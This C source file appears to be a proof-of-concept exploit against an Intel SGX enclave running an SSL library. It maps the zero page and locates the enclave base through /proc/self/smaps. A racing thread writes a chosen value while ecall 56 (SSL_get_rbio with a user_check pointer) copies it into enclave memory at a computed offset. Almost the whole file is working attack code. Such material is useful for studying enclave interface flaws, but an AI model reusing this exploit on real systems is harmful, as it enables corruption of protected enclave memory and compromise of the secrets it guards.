#include <stdio.h>
#include <stdlib.h>

#include <string.h>
#include <pthread.h>

// mmap
#include <fcntl.h>
#include <sys/mman.h>
#include <sys/stat.h>

#include "sgx_edger8r.h" // sgx_ecall
#include "sgx_urts.h" // sgx_create_enclave

/* Global EID shared by multiple threads */
sgx_enclave_id_t global_eid = 0;

int initialize_enclave(const char* enclave_filename)
{
	if (global_eid != 0)
		return 0;

	sgx_launch_token_t token = {0};
	int updated;
	sgx_status_t ret = sgx_create_enclave(enclave_filename, SGX_DEBUG_FLAG, &token, &updated, &global_eid, NULL);
	if (ret != SGX_SUCCESS)
		return -1;

	return 0;
}

void* enclave_base() {
	FILE* fp = fopen("/proc/self/smaps", "r");
	if (fp == 0) return 0;
	char* line = 0; size_t len = 0; ssize_t read;

	// first isgx page (CODE, r_x)
	while((read = getline(&line, &len, fp)) != -1)
			if (strstr(line, "isgx"))
					return (void*)strtoll(line, NULL, 16);
}

int call_ecall(int ecall_idx, void* ms)
{
	sgx_ecall(global_eid, ecall_idx, 0, ms);
}

// this function is run by the second thread
void* thread(void *)
{
	printf("RUNNING\n");
	while (true) {
		*(uint64_t*)0x18 = 0xdeadc0de; // SSL->wbio
	}
}

/*
*****************************************************
* ALLOW ZERO PAGE:    sudo sysctl vm.mmap_min_addr=0
*****************************************************
*/
int main(int argc, char** argv)
{
	if (initialize_enclave("enclave.signed.so") < 0)
		return -1;
	uint64_t* base = (uint64_t*) enclave_base();

	// 1. Map the Zero Page.
	void *zero = mmap(0, 0x10000, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED, 0, 0);

	pthread_t threadid;
	// 2. Create a second thread that will assure that the ECall writes the desires value.
	pthread_create(&threadid, NULL, thread, NULL);

	// 3. This ECall will copy the value from the specified address to the Zero Page AND BACK. Due to the race condition this value can be chosen freely.
	uint64_t ms[] = { 0, (uint64_t)base + 0x57eac08 - 0x18 };
	// public BIO *ecall_SSL_get_rbio([user_check] const SSL *s);
	call_ecall(56, ms);
}
